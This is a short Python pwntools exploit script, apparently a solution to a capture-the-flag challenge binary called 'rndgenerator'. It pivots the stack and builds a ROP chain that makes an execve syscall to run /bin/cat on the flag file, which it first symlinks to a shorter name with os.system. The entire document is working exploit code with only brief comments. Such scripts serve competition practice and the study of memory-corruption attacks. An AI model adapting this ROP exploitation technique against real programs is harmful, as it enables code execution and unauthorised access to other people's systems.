from pwn import *
from struct import pack
import os

context.arch = 'amd64'
context.os = 'linux'
os.system('rm -f flg.txt')
os.system('ln -s flag.txt flg.txt') # link flag.txt to a file with shorter name due to buffer space restrictions

io = process('./rndgenerator')
io.clean()
io.sendline(b"1")
io.clean()

p = b''

p += pack('<Q', 0x00000000595c50a5) # push rax; pop rsp; pop rcx;
p += pack('<Q', 0x0000000000330d60) # pop rax; ret;
p += pack('<Q', 0x3b) # execve
p += pack('<Q', 0x0000000000330d7c) # pop rdi; ret;
p += pack('<Q', 0x0000000000200050) # address of /bin/cat
p += pack('<Q', 0x0000000000330d78) # pop rsi; ret;
p += pack('<Q', 0x0000000000200068) # address of [address of argv]
p += pack('<Q', 0x0000000000330d68) # pop rdx; ret;
p += pack('<Q', 0x0000000000200078) # address of NULL
p += pack('<Q', 0x000000000030143c) # syscall; execve('/bin/cat', ['/bin/cat', 'flg.txt', NULL], NULL)
p += b'/bin/cat'
p += pack('<Q', 0x0000000000000000) # end of string
p += b'flg.txt\x00'
p += pack('<Q', 0x0000000000200050) # address of argv[0] = /bin/cat
p += pack('<Q', 0x0000000000200060) # address of argv[1] = flg.txt
p += pack('<Q', 0x0000000000000000) # NULL
p += pack('<Q', 0x0000000000330e94) # For the function pointer: movsd; ret;
p += b'\x07\x00\x00\x00' # The memory protection bit (prot_exec)

io.send(p)

io.clean()
io.sendline(b"77")
print(io.clean())
